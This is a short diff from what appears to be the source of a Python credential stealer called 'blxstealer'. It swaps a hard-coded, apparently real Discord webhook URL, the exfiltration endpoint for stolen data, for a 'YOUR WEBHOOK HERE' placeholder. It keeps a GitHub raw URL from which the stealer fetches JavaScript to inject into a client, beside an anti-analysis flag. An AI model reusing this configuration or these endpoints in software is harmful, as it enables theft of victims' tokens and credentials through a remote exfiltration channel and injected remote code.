@@ -534,7 +534,7 @@ def mac_check():
             pass
 
 
-hook = "https://discord.com/api/webhooks/1164160737640448020/jXwNmhs4fNMYeXgTfp-kd3crMMFpjSoXu9Vh4W2GnQwPQjpG4CqOUfHLcJkqIJK39mSQ"
+hook = "YOUR WEBHOOK HERE"
 inj3c710n_url = "https://raw.githubusercontent.com/blxstealer/main/main/index.js"
 color =  0x812118
 DETECTED = False
